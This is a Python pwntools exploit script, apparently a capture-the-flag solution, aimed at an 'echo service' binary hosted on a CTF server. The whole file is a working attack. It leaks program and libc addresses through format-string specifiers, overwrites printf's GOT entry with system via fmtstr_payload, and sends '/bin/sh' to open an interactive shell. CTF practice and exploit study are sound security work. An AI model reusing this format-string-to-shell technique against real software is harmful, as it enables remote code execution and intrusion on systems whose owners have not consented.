#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, '''
        echo "hi"
        break *main
        continue
        ''')  # Use tmux
        
    else:
        r = remote("ctf-chall.stembascc.com", 5213)

    return r




def main():
    r = conn()
    r.sendline("%17$p")
    r.recvuntil(b"Welcome to echo service!\n")
    main_43_leak = int(r.recvline().strip().decode(),16)
    main_43_offset = exe.sym['main'] + 43
    exe.address = main_43_leak - main_43_offset
    print(f"leak main Adress: {hex(main_43_leak)}")
    print(f"Base Adress: {hex(exe.address)}")
    r.sendline("%7$p")
    _IO_2_1_stdout_leak = int(r.recvline().strip().decode(),16)
    _IO_2_1_stdout_offset = libc.sym['puts'] + 506
    libc.address = _IO_2_1_stdout_leak - _IO_2_1_stdout_offset
    print(f"leak stdout Adress: {hex(_IO_2_1_stdout_leak)}")
    print(f"Libc Adress: {hex(libc.address)}")
    offset = 6
    print(f"System Address {hex(libc.sym['system'])}")
    payload = fmtstr_payload(offset, {exe.got['printf']: libc.sym['system']}, write_size='short')
    print(len(payload))  # Check if this reduces the length below 72
    r.sendline(payload)
    r.clean()
    r.sendline('/bin/sh')
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
